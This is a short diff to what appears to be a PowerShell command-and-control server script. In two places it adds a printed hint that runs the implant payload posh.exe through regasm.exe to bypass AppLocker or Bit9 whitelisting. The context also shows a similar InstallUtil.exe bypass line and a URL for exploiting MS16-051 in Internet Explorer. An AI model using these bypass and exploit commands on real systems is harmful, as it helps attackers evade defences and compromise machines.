@@ -305,6 +305,7 @@ if ($RestartC2Server)
     write-host ""
     Write-Host "To Bypass AppLocker or Bit9, use InstallUtil.exe found by SubTee:"
     write-host "C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U $global:newdir\payloads\posh.exe" -ForegroundColor green
+    write-host "C:\Windows\Microsoft.NET\Framework\v4.0.30319\regasm.exe /U $global:newdir\payloads\posh.exe" -ForegroundColor green
     write-host ""
     Write-Host "To exploit MS16-051 via IE9-11 use the following URL:"
     write-host "$($ipv4address):$($serverport)/webapp/static/$($downloaduri)_ms16-051" -ForegroundColor green
@@ -663,6 +664,7 @@ RewriteRule ^/steam(.*) $uri<IP ADDRESS>/steam`$1 [NC,P]
     write-host ""
     Write-Host "To Bypass AppLocker or Bit9, use InstallUtil.exe found by SubTee:"
     write-host "C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U $global:newdir\payloads\posh.exe" -ForegroundColor green
+    write-host "C:\Windows\Microsoft.NET\Framework\v4.0.30319\regasm.exe /U $global:newdir\payloads\posh.exe" -ForegroundColor green
     write-host ""
     Write-Host "To exploit MS16-051 via IE9-11 use the following URL:"
     write-host "$($ipv4address):$($serverport)/webapp/static/$($downloaduri)_ms16-051" -ForegroundColor green
